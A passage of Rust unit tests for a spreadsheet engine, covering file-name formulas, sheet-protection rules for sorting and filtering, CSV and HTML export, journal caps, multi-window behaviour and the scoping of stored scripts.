    // Saved: it names the file. `CELL` is volatile, so the cells holding it answer from the next
    // recalculation (F9), the same as every other volatile function; the save itself is not one.
    let first = dir.join("book one.xlsx");
    fresh.execute("file.saveAs", json!({"path": first})).unwrap();
    let sheet = fresh.doc().unwrap().wb.active().unwrap().name.clone();
    // Saving did not leave the workbook looking modified.
    assert!(!fresh.doc().unwrap().is_dirty());
    fresh.execute("formulas.calculateNow", json!({})).unwrap();
    assert_eq!(v(&fresh, "A1"), Value::from(dir.join(format!("[book one.xlsx]{sheet}")).to_string_lossy().into_owned().as_str()));
    assert_eq!(v(&fresh, "A2"), Value::from(sheet.as_str()));

    // Opened from that path in another session: the same answer, from the file alone.
    let mut opened = s();
    opened.execute("file.open", json!({"path": first})).unwrap();
    opened.take_ui_requests();
    assert_eq!(v(&opened, "A2"), Value::from(sheet.as_str()));

    // Save As into another folder: it follows the new file, not the old one.
    let other = dir.join("sub");
    std::fs::create_dir(&other).unwrap();
    opened.execute("file.saveAs", json!({"path": other.join("book two.xlsx")})).unwrap();
    assert!(!opened.doc().unwrap().is_dirty());
    opened.execute("formulas.calculateNow", json!({})).unwrap();
    assert_eq!(v(&opened, "A1"), Value::from(other.join(format!("[book two.xlsx]{sheet}")).to_string_lossy().into_owned().as_str()));

    // Opened from bytes there is no folder, only a name — still splittable on the `]`.
    let saved = opened.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
    let mut from_bytes = s();
    from_bytes.execute("file.open", json!({"name": "from bytes.xlsx", "base64": saved["base64"]})).unwrap();
    from_bytes.take_ui_requests();
    assert_eq!(v(&from_bytes, "A1"), Value::from(format!("[from bytes.xlsx]{sheet}").as_str()));
    assert_eq!(v(&from_bytes, "A2"), Value::from(sheet.as_str()));

    std::fs::remove_dir_all(dir).unwrap();
}

/// Protect Sheet's Sort and Use AutoFilter tick boxes are obeyed. They were read from the file and
/// written back but never consulted, so a protected sheet could still be sorted and filtered.
///
/// Sorting locked cells stays refused whichever way the box is set, which is Excel's rule too
/// ("users cannot sort ranges that contain locked cells on a protected worksheet"), so the box
/// decides for a range that has been unlocked. An AutoFilter changes no cell's contents, so there
/// the box is the only thing that decides.
#[test]
fn a_protected_sheet_allows_sorting_and_filtering_only_when_it_says_so() {
    let allow = |s: &mut Session, f: fn(&mut gridcraft_model::SheetProtection)| {
        let d = s.doc_mut().unwrap();
        let mut wb = (*d.wb).clone();
        if let Some(p) = wb.sheet_mut(0).and_then(|sh| sh.protection.as_mut()) {
            f(p);
        }
        d.wb = std::sync::Arc::new(wb);
    };
    // Three rows under a header, and the cells unlocked so that the tick box is what decides.
    let book = || {
        let mut s = s();
        for (c, v) in [("A1", "Head"), ("A2", "2"), ("A3", "1")] {
            s.execute("cell.set", json!({"cell": c, "input": v})).unwrap();
        }
        s.execute("home.lockCell", json!({"range": "A1:A3", "on": false})).unwrap();
        s
    };
    let order = |s: &Session| (v(s, "A2"), v(s, "A3"));

    // Unprotected: both work, so the guard has not made the ordinary case stricter.
    let mut s = book();
    s.execute("data.sortAscending", json!({})).unwrap();
    assert_eq!(order(&s), (Value::Number(1.0), Value::Number(2.0)));
    s.execute("data.filter", json!({})).unwrap();

    // Protected with nothing ticked, which is what Excel's dialog opens with: both refused.
    let mut s = book();
    s.execute("review.protectSheet", json!({})).unwrap();
    for (cmd, args) in [
        ("data.sortAscending", json!({})),
        ("data.sortDescending", json!({})),
        // Sort… needs a key to be a sort at all: with none it does nothing either way.
        ("data.sort", json!({"keys": [{"column": "A", "order": "asc"}]})),
        ("data.filter", json!({})),
        ("data.filterBy", json!({})),
    ] {
        let e = s.execute(cmd, args).expect_err(cmd).to_string();
        assert!(e.contains("protected sheet"), "{cmd}: {e}");
    }
    // Refused, not half-applied: the rows are where they were.
    assert_eq!(order(&s), (Value::Number(2.0), Value::Number(1.0)));
    assert!(s.doc().unwrap().wb.sheet(0).unwrap().autofilter.is_none());

    // Sort ticked: sorting works on the unlocked range; filtering is still refused.
    let mut s = book();
    s.execute("review.protectSheet", json!({})).unwrap();
    allow(&mut s, |p| p.sort = true);
    s.execute("data.sortAscending", json!({})).unwrap();
    assert_eq!(order(&s), (Value::Number(1.0), Value::Number(2.0)), "sorted under the header");
    assert!(s.execute("data.filter", json!({})).is_err(), "Use AutoFilter is still off");

    // Use AutoFilter ticked: the filter goes on, and sorting is refused.
    let mut s = book();
    s.execute("review.protectSheet", json!({})).unwrap();
    allow(&mut s, |p| p.autofilter = true);
    s.execute("data.filter", json!({})).unwrap();
    assert!(s.doc().unwrap().wb.sheet(0).unwrap().autofilter.is_some(), "the AutoFilter is on");
    assert!(s.execute("data.sortAscending", json!({})).is_err(), "Sort is still off");
    // Unprotecting gives sorting back.
    s.execute("review.unprotectSheet", json!({})).unwrap();
    s.execute("data.sortAscending", json!({})).unwrap();

    // Locked cells: ticking Sort does not let them be reordered, as in Excel.
    let mut s = {
        let mut t = super::tests::s();
        for (c, v) in [("A1", "Head"), ("A2", "2"), ("A3", "1")] {
            t.execute("cell.set", json!({"cell": c, "input": v})).unwrap();
        }
        t
    };
    s.execute("review.protectSheet", json!({})).unwrap();
    allow(&mut s, |p| p.sort = true);
    assert!(s.execute("data.sortAscending", json!({})).is_err(), "locked cells cannot be sorted");
    assert_eq!(order(&s), (Value::Number(2.0), Value::Number(1.0)));
}

#[test]
fn convert_to_number_turns_numbers_stored_as_text_into_numbers() {
    let mut s = s();
    let value = |s: &mut Session, cell: &str| s.execute("cell.get", json!({"cell": cell})).unwrap()["value"].clone();
    for (cell, input) in [("A1", "'123"), ("A2", "'1,000.5"), ("A3", "'abc"), ("A4", "'3/4/2026"), ("A5", "=\"7\"")] {
        s.execute("cell.set", json!({"cell": cell, "input": input})).unwrap();
    }
    s.execute("home.bold", json!({"range": "A1", "on": true})).unwrap();
    let r = s.execute("formulas.convertToNumber", json!({"range": "A1:A5"})).unwrap();
    assert_eq!(r["converted"], 2);
    assert_eq!(value(&mut s, "A1"), json!(123.0));
    assert_eq!(value(&mut s, "A2"), json!(1000.5));
    // Words, date text and a formula's text result stay as they are.
    assert_eq!(value(&mut s, "A3"), json!("abc"));
    assert_eq!(value(&mut s, "A4"), json!("3/4/2026"));
    assert_eq!(value(&mut s, "A5"), json!("7"));
    assert_eq!(s.execute("cell.get", json!({"cell": "A1"})).unwrap()["style"]["font"]["bold"], true, "the format is kept");
    // SUM now counts them; undo brings the text back in one step.
    s.execute("cell.set", json!({"cell": "B1", "input": "=SUM(A1:A2)"})).unwrap();
    assert_eq!(value(&mut s, "B1"), json!(1123.5));
    s.execute("edit.undo", json!({})).unwrap();
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(value(&mut s, "A1"), json!("123"));
    // With no range it works on the selection.
    s.execute("selection.set", json!({"range": "A2"})).unwrap();
    assert_eq!(s.execute("formulas.convertToNumber", json!({})).unwrap()["converted"], 1);
    assert_eq!(value(&mut s, "A1"), json!("123"));
}

#[test]
fn saving_csv_keeps_leading_empty_columns_and_rows() {
    let wb = gridcraft_xlsx::read_csv(b",x\r\n\r\n,,y\r\n", &gridcraft_xlsx::CsvOptions::default()).unwrap();
    let out = crate::io::save_bytes(&wb, "a.csv").unwrap();
    assert_eq!(String::from_utf8(out).unwrap(), ",x,\r\n,,\r\n,,y\r\n");
}

#[test]
fn rotate_rejects_flip_param_instead_of_swapping_size() {
    let mut s = s();
    let id = s.execute("insert.shape", json!({"kind": "rectangle"})).unwrap()["shape"].clone();
    let size = |s: &Session| {
        let a = &s.doc().unwrap().wb.active().unwrap().shapes[0].anchor;
        (a.width, a.height)
    };
    let (w, h) = size(&s);
    assert_ne!(w, h);
    let before = s.doc().unwrap().wb.clone();
    for flip in ["horizontal", "vertical", "sideways"] {
        let r = s.execute("arrange.rotate", json!({"kind": "shape", "id": id, "flip": flip}));
        assert!(matches!(r, Err(crate::EngineError::BadParams { .. })), "flip {flip}: {r:?}");
        assert_eq!(size(&s), (w, h));
        assert!(std::sync::Arc::ptr_eq(&s.doc().unwrap().wb, &before));
    }
    s.execute("arrange.rotate", json!({"kind": "shape", "id": id})).unwrap();
    assert_eq!(size(&s), (h, w));
}

#[test]
fn box_whisker_quartile_methods_survive_xlsx() {
    use gridcraft_model::QuartileMethod;
    let mut s = s();
    chart_data(&mut s);
    s.execute("insert.chart", json!({"range": "A1:C5", "type": "boxWhisker"})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().charts[0].series[0].quartiles, QuartileMethod::Exclusive);
    s.execute("chart.set", json!({"quartiles": "inclusive"})).unwrap();
    assert!(s.doc().unwrap().wb.active().unwrap().charts[0].series.iter().all(|s| s.quartiles == QuartileMethod::Inclusive));
    for invalid in [json!("median"), json!(null), json!(1)] {
        assert!(s.execute("chart.set", json!({"quartiles": invalid, "title": "Changed"})).is_err());
    }
    assert_ne!(s.doc().unwrap().wb.active().unwrap().charts[0].title.as_deref(), Some("Changed"));
    // Imported series can differ; changing a chart's setting applies to all its series.
    let mut wb = (*s.doc().unwrap().wb).clone();
    let sh = wb.sheet_mut(0).unwrap();
    assert!(sh.charts[0].series.len() > 1);
    sh.charts[0].series[1].quartiles = QuartileMethod::Exclusive;
    let bytes = gridcraft_xlsx::write_xlsx(&wb).unwrap();
    let (back, _) = gridcraft_xlsx::read_xlsx(&bytes).unwrap();
    let series = &back.active().unwrap().charts[0].series;
    assert_eq!(series[0].quartiles, QuartileMethod::Inclusive);
    assert_eq!(series[1].quartiles, QuartileMethod::Exclusive);
    s.execute("chart.set", json!({"quartiles": "exclusive"})).unwrap();
    assert!(s.doc().unwrap().wb.active().unwrap().charts[0].series.iter().all(|s| s.quartiles == QuartileMethod::Exclusive));
}

#[test]
fn journal_is_capped_by_serialized_size() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "5"})).unwrap();
    // Large entries (like a `file.open` with its base64): the oldest go once the cap is passed.
    let pad = "x".repeat(crate::JOURNAL_MAX_BYTES / 8);
    for i in 0..12 {
        s.execute("selection.set", json!({"range": "B2", "pad": pad, "n": i})).unwrap();
    }
    let bytes: usize = s.journal.iter().map(|e| serde_json::to_vec(e).unwrap().len()).sum();
    assert!(bytes <= crate::JOURNAL_MAX_BYTES, "{bytes}");
    assert!(s.journal.len() < 12, "{}", s.journal.len());
    assert_eq!(s.journal.last().unwrap().1["n"], 11, "the newest entries stay");
    // Small entries are kept as they were.
    s.execute("cell.set", json!({"cell": "A2", "input": "=SUM(A1)"})).unwrap();
    assert_eq!(s.journal.last().unwrap(), &("cell.set".to_string(), json!({"cell": "A2", "input": "=SUM(A1)"})));
}

#[test]
fn recording_keeps_its_steps_when_the_journal_is_trimmed() {
    let mut s = s();
    for _ in 0..9_990 {
        s.execute("selection.set", json!({"range": "A1"})).unwrap();
    }
    s.execute("automate.recordActions", json!({})).unwrap();
    // The 10th entry past the start overflows the 10,000-entry cap and drops the oldest half.
    for i in 0..20 {
        s.execute("cell.set", json!({"cell": "B1", "input": format!("step{i}")})).unwrap();
    }
    let r = s.execute("automate.recordActions", json!({"stop": true, "name": "Steps"})).unwrap();
    assert_eq!(r["steps"], 20, "{r}");
    let script = s.doc().unwrap().wb.names.iter().find(|n| n.name == "_sc_scripts").map(|n| n.formula.clone()).unwrap();
    assert!(script.contains("step0") && script.contains("step19") && !script.contains("selection.set"), "{script}");
}

#[test]
fn html_export_draws_charts_as_inline_svg_with_their_text() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Month", "Sales"], ["Jan", 5], ["Feb", 7], ["Mar", 9]]})).unwrap();
    s.execute("insert.chart", json!({"range": "A1:B4", "type": "column", "title": "Quarterly <Sales>", "at": "D2", "width": 300, "height": 200}))
        .unwrap();
    let html = crate::io::to_html(&s.doc().unwrap().wb, 0).unwrap();
    assert!(html.contains("<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"300\" height=\"200\""), "{html}");
    assert!(html.contains(">Quarterly &lt;Sales&gt;</text>"), "the title is drawn as escaped text: {html}");
    assert!(html.contains("position:absolute;left:"), "{html}");
    assert!(html.contains("<rect "), "{html}");
}

#[test]
fn html_export_draws_pie_wedges_as_svg_paths() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Region", "Share"], ["North", 60], ["South", 40]]})).unwrap();
    s.execute("insert.chart", json!({"range": "A1:B3", "type": "pie", "title": "Share"})).unwrap();
    let html = crate::io::to_html(&s.doc().unwrap().wb, 0).unwrap();
    assert!(html.matches("<path d=\"M").count() >= 2, "one wedge per slice: {html}");
    assert!(html.contains(">North</text>") && html.contains(">South</text>"), "the legend names the slices: {html}");
}

#[test]
fn html_export_without_pictures_or_charts_has_no_fixed_geometry() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["a", "b"]]})).unwrap();
    let html = crate::io::to_html(&s.doc().unwrap().wb, 0).unwrap();
    assert!(!html.contains("<colgroup>") && !html.contains("table-layout") && !html.contains("<svg") && !html.contains("<img"), "{html}");
}

#[test]
fn switch_windows_lists_workbooks_by_stable_id_and_switches_to_one() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "first"})).unwrap();
    let book1 = s.doc().unwrap().uid;
    s.execute("file.new", json!({})).unwrap();
    s.execute("file.new", json!({})).unwrap();
    let book3 = s.doc().unwrap().uid;
    let list = s.execute("view.switchWindows", json!({})).unwrap();
    let rows = list.as_array().unwrap();
    assert_eq!(rows.len(), 3);
    assert_eq!((rows[0]["doc"].as_u64(), rows[0]["title"].as_str(), rows[0]["dirty"].as_bool()), (Some(book1), Some("Book1"), Some(true)));
    assert_eq!((rows[2]["dirty"].as_bool(), rows[2]["active"].as_bool()), (Some(false), Some(true)));

    // Closing a workbook shifts the indexes but not the ids.
    s.execute("window.activate", json!({"index": 1})).unwrap();
    s.execute("file.close", json!({"force": true})).unwrap();
    assert_eq!(s.document_index(book3), Some(1));
    let list = s.execute("view.switchWindows", json!({"doc": book1})).unwrap();
    assert_eq!(s.doc().unwrap().uid, book1);
    assert_eq!(v(&s, "A1"), Value::text("first"));
    assert_eq!(list[0]["active"].as_bool(), Some(true));
    s.execute("file.save", json!({"path": std::env::temp_dir().join(format!("gridcraft-uid-{}.xlsx", std::process::id()))})).unwrap();
    assert_eq!(s.doc().unwrap().uid, book1, "saving keeps the id");
    let _ = std::fs::remove_file(std::env::temp_dir().join(format!("gridcraft-uid-{}.xlsx", std::process::id())));

    assert!(s.execute("view.switchWindows", json!({"doc": book3 + 1000})).is_err());
    assert!(s.execute("view.switchWindows", json!({"doc": "Book1"})).is_err());
    assert_eq!(s.doc().unwrap().uid, book1, "a bad id leaves the active workbook alone");
}

#[test]
fn new_window_shares_the_workbook_and_closes_window_by_window() {
    let mut s = s();
    let book = s.doc().unwrap().uid;
    assert_eq!(s.windows().len(), 1, "a new workbook opens in one window");
    let first = s.active_window().unwrap();
    assert_eq!(s.window_title(first).as_deref(), Some("Book1"));

    let r = s.execute("view.newWindow", json!({})).unwrap();
    let second = r["window"].as_u64().unwrap();
    assert_eq!(s.documents().len(), 1, "no copy of the workbook");
    assert_eq!((s.windows().len(), s.active_window()), (2, Some(second)));
    assert_eq!(s.window_title(first).as_deref(), Some("Book1:1"));
    assert_eq!(s.window_title(second).as_deref(), Some("Book1:2"));
    assert!(!s.doc().unwrap().is_dirty());

    // An edit in window 2 is in window 1's workbook, and saving from window 2 saves it.
    s.execute("cell.set", json!({"cell": "A1", "input": "shared"})).unwrap();
    let path = std::env::temp_dir().join(format!("gridcraft-windows-{}.xlsx", std::process::id()));
    s.execute("file.save", json!({"path": path})).unwrap();
    s.execute("window.activate", json!({"window": first})).unwrap();
    assert_eq!((s.doc().unwrap().uid, v(&s, "A1")), (book, Value::text("shared")));
    assert!(!s.doc().unwrap().is_dirty(), "saved from the other window");
    assert_eq!(s.doc().unwrap().path.as_deref(), path.to_str());
    let _ = std::fs::remove_file(&path);

    // Closing one window keeps the workbook and renumbers the titles; the last one closes it.
    s.execute("cell.set", json!({"cell": "A2", "input": "unsaved"})).unwrap();
    let r = s.execute("file.close", json!({})).unwrap();
    assert_eq!((r["closed"].as_bool(), r["document"].as_bool()), (Some(true), Some(false)), "no prompt for one of two windows");
    assert_eq!((s.windows().len(), s.active_window()), (1, Some(second)));
    assert_eq!(s.window_title(second).as_deref(), Some(s.doc().unwrap().display_title().as_str()));
    let r = s.execute("window.close", json!({})).unwrap();
    assert_eq!(r["closed"].as_bool(), Some(false), "the last window asks about unsaved changes");
    assert_eq!(s.documents().len(), 1);
    s.execute("window.close", json!({"force": true})).unwrap();
    assert!(s.documents().is_empty() && s.windows().is_empty() && s.active_window().is_none());
}

#[test]
fn switching_windows_swaps_their_views_without_dirtying_the_workbook() {
    let mut s = s();
    s.execute("home.insertSheet", json!({})).unwrap();
    let path = std::env::temp_dir().join(format!("gridcraft-window-views-{}.xlsx", std::process::id()));
    s.execute("file.save", json!({"path": path})).unwrap();
    let _ = std::fs::remove_file(&path);
    s.execute("sheet.activate", json!({"sheet": 0})).unwrap();
    s.execute("selection.set", json!({"range": "B2:C3"})).unwrap();
    let first = s.active_window().unwrap();
    let second = s.execute("view.newWindow", json!({})).unwrap()["window"].as_u64().unwrap();
    s.execute("sheet.activate", json!({"sheet": 1})).unwrap();
    s.execute("selection.set", json!({"range": "D4"})).unwrap();
    assert!(!s.doc().unwrap().is_dirty());

    s.execute("window.activate", json!({"window": first})).unwrap();
    let d = s.doc().unwrap();
    assert_eq!((d.wb.active_sheet(), d.selection.a1()), (0, "B2:C3".to_string()));
    assert!(!d.is_dirty(), "a window's sheet and selection are not document changes");
    s.execute("view.switchWindows", json!({"window": second})).unwrap();
    let d = s.doc().unwrap();
    assert_eq!((d.wb.active_sheet(), d.selection.a1()), (1, "D4".to_string()));
    assert!(!d.is_dirty());

    // A routed command acts in its window and leaves the active one showing.
    s.execute_in(crate::Target::Window(first), "cell.set", json!({"cell": "A1", "input": "in window 1"})).unwrap();
    assert_eq!(s.active_window(), Some(second));
    assert_eq!(s.doc().unwrap().wb.sheets[0].value(CellRef::parse("A1").unwrap()), Value::text("in window 1"));
    assert_eq!(s.doc().unwrap().selection.a1(), "D4");
}

#[test]
fn window_swaps_share_the_workbook_and_save_records_the_latest_window_sheet() {
    let mut s = s();
    s.execute("home.insertSheet", json!({})).unwrap();
    let path = std::env::temp_dir().join(format!("gridcraft-window-arc-{}.xlsx", std::process::id()));
    s.execute("file.save", json!({"path": path})).unwrap();
    s.execute("sheet.activate", json!({"sheet": 0})).unwrap();
    s.execute("selection.set", json!({"range": "B2"})).unwrap();
    let first = s.active_window().unwrap();
    let second = s.execute("view.newWindow", json!({})).unwrap()["window"].as_u64().unwrap();
    s.execute("sheet.activate", json!({"sheet": 1})).unwrap();
    s.execute("selection.set", json!({"range": "C3:D4"})).unwrap();

    // Swapping windows, as the interface does before drawing each one, never copies the workbook.
    let before = s.doc().unwrap().wb.clone();
    for _ in 0..3 {
        s.show_window(first);
        assert_eq!((s.doc().unwrap().wb.active_sheet(), s.doc().unwrap().selection.a1()), (0, "B2".to_string()));
        s.activate_window(second);
        assert_eq!((s.doc().unwrap().wb.active_sheet(), s.doc().unwrap().selection.a1()), (1, "C3:D4".to_string()));
        s.execute("sheet.activate", json!({"sheet": 0})).unwrap();
        s.execute("sheet.activate", json!({"sheet": 1})).unwrap();
    }
    let d = s.doc().unwrap();
    assert!(std::sync::Arc::ptr_eq(&before, &d.wb), "a window swap or sheet switch copied the workbook");
    assert!(!d.is_dirty());

    // A command run in window 2 edits window 2's sheet at its selection.
    s.execute("cell.set", json!({"input": "two"})).unwrap();
    let d = s.doc().unwrap();
    assert_eq!(d.wb.sheets[1].value(CellRef::parse("C3").unwrap()), Value::text("two"));
    assert_eq!(d.wb.sheets[0].value(CellRef::parse("B2").unwrap()), Value::Empty);
    s.show_window(first);
    assert_eq!(s.doc().unwrap().wb.active_sheet(), 0);

    // The most recently active window is window 2: the file records its sheet.
    s.execute_in(crate::Target::Window(second), "file.save", json!({"path": path})).unwrap();
    let mut t = Session::new();
    t.execute("file.open", json!({"path": path})).unwrap();
    let _ = std::fs::remove_file(&path);
    assert_eq!(t.doc().unwrap().wb.active_sheet(), 1);
    s.activate_window(first);
    s.execute("file.save", json!({"path": path})).unwrap();
    let mut t = Session::new();
    t.execute("file.open", json!({"path": path})).unwrap();
    let _ = std::fs::remove_file(&path);
    assert_eq!(t.doc().unwrap().wb.active_sheet(), 0);
}

#[test]
fn arrange_all_picks_the_visible_windows_active_first() {
    let mut s = s();
    let book1 = s.active_window().unwrap();
    let book1b = s.execute("view.newWindow", json!({})).unwrap()["window"].as_u64().unwrap();
    s.execute("file.new", json!({})).unwrap();
    let book2 = s.active_window().unwrap();
    let r = s.execute("view.arrangeAll", json!({})).unwrap();
    assert_eq!(r, json!({"arrange": "tiled", "windows": [book2, book1, book1b]}));
    s.execute("window.activate", json!({"window": book1b})).unwrap();
    s.execute("view.hideWindow", json!({"window": book2})).unwrap();
    let r = s.execute("view.arrangeAll", json!({"arrange": "cascade", "activeWorkbook": true})).unwrap();
    assert_eq!(r, json!({"arrange": "cascade", "windows": [book1b, book1]}));
    assert!(s.execute("view.arrangeAll", json!({"arrange": "diagonal"})).is_err());
}

#[test]
fn hide_unhide_and_switch_by_window_id() {
    let mut s = s();
    let book1 = s.doc().unwrap().uid;
    let w1 = s.active_window().unwrap();
    let w2 = s.execute("view.newWindow", json!({})).unwrap()["window"].as_u64().unwrap();
    s.execute("file.new", json!({})).unwrap();
    let w3 = s.active_window().unwrap();
    s.execute("view.hideWindow", json!({})).unwrap();
    assert_eq!(s.active_window(), Some(w2), "the most recent visible window comes forward");
    let list = s.execute("window.list", json!({})).unwrap();
    let rows = list.as_array().unwrap();
    assert_eq!(rows.len(), 3);
    assert_eq!((rows[0]["window"].as_u64(), rows[0]["title"].as_str(), rows[0]["doc"].as_u64()), (Some(w1), Some("Book1:1"), Some(book1)));
    assert_eq!((rows[2]["title"].as_str(), rows[2]["hidden"].as_bool()), (Some("Book2"), Some(true)));
    assert_eq!(rows[1]["active"].as_bool(), Some(true));
    s.execute("view.unhideWindow", json!({})).unwrap();
    assert_eq!(s.active_window(), Some(w3));
    assert!(!s.window(w3).unwrap().hidden);
    // A workbook id goes to that workbook's most recent window.
    s.execute("view.switchWindows", json!({"doc": book1})).unwrap();
    assert_eq!(s.active_window(), Some(w2));
    assert!(s.execute("window.activate", json!({"window": 999})).is_err());
    assert_eq!(s.active_window(), Some(w2));
}

#[test]
fn open_replaces_an_untouched_blank_workbook_and_its_windows() {
    let mut s = s();
    s.execute("view.newWindow", json!({})).unwrap();
    let path = std::env::temp_dir().join(format!("gridcraft-open-blank-{}.csv", std::process::id()));
    std::fs::write(&path, "a,b\n1,2\n").unwrap();
    s.execute("file.open", json!({"path": path})).unwrap();
    let _ = std::fs::remove_file(&path);
    assert_eq!(s.documents().len(), 1);
    assert_eq!(s.windows().len(), 1, "the blank workbook's windows closed with it");
    assert_eq!(s.windows()[0].doc_uid, s.doc().unwrap().uid);
}

#[test]
fn format_cells_permission_on_a_protected_sheet_cannot_unlock_cells() {
    // Formatting may be allowed on a protected sheet; the permission can't serve as a key to
    // content edits, so the format cells may not drop a cell's `locked` flag.
    let mut s = s();
    s.execute("cell.set", json!({"cell": "B2", "input": "hi"})).unwrap();
    s.execute("review.protectSheet", json!({"formatCells": true})).unwrap();
    s.execute("home.fontName", json!({"name": "Arial"})).unwrap();
    let err = s.execute("home.lockCell", json!({"range": "B2", "on": false})).expect_err("unlock through formatting");
    assert!(err.to_string().contains("protected"), "{err}");
    assert!(s.execute("cell.set", json!({"cell": "B2", "input": "x"})).is_err(), "B2 stays locked");
    // The same calls run once the sheet is unprotected.
    s.execute("review.unprotectSheet", json!({})).unwrap();
    s.execute("home.lockCell", json!({"range": "B2", "on": false})).unwrap();
    s.execute("cell.set", json!({"cell": "B2", "input": "x"})).unwrap();
    assert_eq!(v(&s, "B2"), Value::text("x"));
}

#[test]
fn move_columns_checks_the_protection_of_the_named_sheet() {
    // The move's protection checks must authorize the sheet it modifies, not whichever sheet
    // happens to be active while the command names another one.
    let mut s = s();
    s.execute("home.insertSheet", json!({"name": "P"})).unwrap();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2, 3, 4]]})).unwrap();
    s.execute("review.protectSheet", json!({})).unwrap();
    s.execute("sheet.activate", json!({"sheet": 0})).unwrap();
    let err = s.execute("sheet.moveColumns", json!({"sheet": "P", "cols": "B:C", "before": 4})).expect_err("moving columns on a protected sheet");
    assert!(err.to_string().contains("protected"), "{err}");
    let pv: Vec<Value> = {
        let d = s.doc().unwrap();
        let sh = &d.wb.sheets[d.wb.sheet_index("P").unwrap()];
        (0..4).map(|c| sh.value(CellRef::new(0, c as u32))).collect()
    };
    assert_eq!(pv, vec![Value::number(1.0), Value::number(2.0), Value::number(3.0), Value::number(4.0)]);
    // The active, unprotected sheet moves fine.
    s.execute("range.setValues", json!({"range": "A1", "values": [["A", "B", "C", "D"]]})).unwrap();
    s.execute("sheet.moveColumns", json!({"cols": "B:B", "before": 4})).unwrap();
    assert_eq!(v(&s, "A1"), Value::text("A"));
}

#[test]
fn move_columns_checks_the_protection_of_a_sheet_named_by_its_range() {
    // A `Sheet!` range or cell picks the sheet the move modifies; the protection checks must
    // authorize that sheet too, not the active one.
    let mut s = s();
    s.execute("home.insertSheet", json!({"name": "P"})).unwrap();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2, 3, 4]]})).unwrap();
    s.execute("review.protectSheet", json!({})).unwrap();
    s.execute("sheet.activate", json!({"sheet": 0})).unwrap();
    for key in ["range", "cell"] {
        let err = s.execute("sheet.moveColumns", json!({key: "P!A1", "cols": "B:C", "before": 4})).expect_err("moving columns on a protected sheet");
        assert!(err.to_string().contains("protected"), "{err}");
    }
    let d = s.doc().unwrap();
    let sh = &d.wb.sheets[d.wb.sheet_index("P").unwrap()];
    let pv: Vec<Value> = (0..4).map(|c| sh.value(CellRef::new(0, c))).collect();
    assert_eq!(pv, vec![Value::number(1.0), Value::number(2.0), Value::number(3.0), Value::number(4.0)]);
}

#[test]
fn sorting_cannot_unlock_a_locked_cell_by_moving_equal_content_onto_it() {
    // An unlocked 2 sorted onto a locked 2 leaves the content as it was, but would make the cell
    // editable; the sort is refused instead.
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[2], [2], [1]]})).unwrap();
    s.execute("home.lockCell", json!({"range": "A1", "on": false})).unwrap();
    s.execute("home.lockCell", json!({"range": "A3", "on": false})).unwrap();
    s.execute("review.protectSheet", json!({"sort": true})).unwrap();
    let before = s.doc().unwrap().wb.clone();
    let err =
        s.execute("data.sort", json!({"range": "A1:A3", "header": false, "keys": [{"column": "A", "order": "asc"}]})).expect_err("sort unlocking A2");
    assert!(err.to_string().contains("protected sheet"), "{err}");
    assert_eq!(*s.doc().unwrap().wb, *before);
    assert!(s.execute("cell.set", json!({"cell": "A2", "input": "9"})).is_err(), "A2 stays locked");
}

#[test]
fn a_script_cannot_switch_windows() {
    // Stored scripts are scoped to their workbook: a step that activates another window would
    // point every later step at another open document, so it is refused before any step runs.
    let mut s = s();
    s.execute("automate.newScript", json!({"name": "t", "commands": [{"command": "window.activate", "params": {"index": 0}}]})).unwrap();
    s.execute("automate.trustScripts", json!({"trusted": true})).unwrap();
    let err = s.execute("automate.runScript", json!({"name": "t"})).expect_err("script switching windows");
    assert!(err.to_string().contains("window.activate"), "{err}");
    s.execute("automate.newScript", json!({"name": "sw", "commands": [{"command": "view.switchWindows", "params": {"doc": 1}}]})).unwrap();
    let err = s.execute("automate.runScript", json!({"name": "sw"})).expect_err("script switching windows from the View tab");
    assert!(err.to_string().contains("view.switchWindows"), "{err}");
    // A benign script runs.
    s.execute("automate.newScript", json!({"name": "ok", "commands": [{"command": "cell.set", "params": {"cell": "A1", "input": "=1+1"}}]})).unwrap();
    s.execute("automate.runScript", json!({"name": "ok"})).unwrap();
    assert_eq!(v(&s, "A1"), Value::number(2.0));
}

mod chart_data;
mod controls;
mod equation;
mod json_golden;
mod macros;
mod objects;
mod python_cells;
mod python_commands;
mod python_files;

#[test]
fn text_to_columns_keeps_a_mid_field_quote() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "'5\" pipe,abc"})).unwrap();
    s.execute("data.textToColumns", json!({"range": "A1", "delimiters": [","]})).unwrap();
    assert_eq!(v(&s, "A1"), Value::text("5\" pipe"));
    assert_eq!(v(&s, "B1"), Value::text("abc"));
}

mod seams;

#[test]
fn a_saved_workbook_keeps_its_values_until_an_edit_reaches_them() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "2"})).unwrap();
    s.execute("cell.set", json!({"cell": "B1", "input": "=A1*2"})).unwrap();
    s.execute("cell.set", json!({"cell": "C1", "input": "=10"})).unwrap();
    let mut wb = (*s.doc().unwrap().wb).clone();
    // The values a file would have saved, not the ones the formulas give.
    for (a, n) in [("B1", 99.0), ("C1", 7.0)] {
        let sheet = std::sync::Arc::make_mut(&mut wb.sheets[0]);
        let c = CellRef::parse(a).unwrap();
        let mut cell = sheet.cells.get(c).unwrap().clone();
        cell.value = Value::Number(n);
        sheet.set_cell(c, cell);
    }
    let mut saved = Session::new();
    saved.add_document(crate::DocState::from_saved(wb, None, "saved".into(), crate::Trust::FromFile));
    assert_eq!(v(&saved, "B1"), Value::Number(99.0));
    saved.execute("cell.set", json!({"cell": "A1", "input": "3"})).unwrap();
    assert_eq!(v(&saved, "B1"), Value::Number(6.0));
    assert_eq!(v(&saved, "C1"), Value::Number(7.0));
}

/// A per-test unique suffix for temp dir names.
#[cfg(not(target_arch = "wasm32"))]
fn unique_nonce() -> u64 {
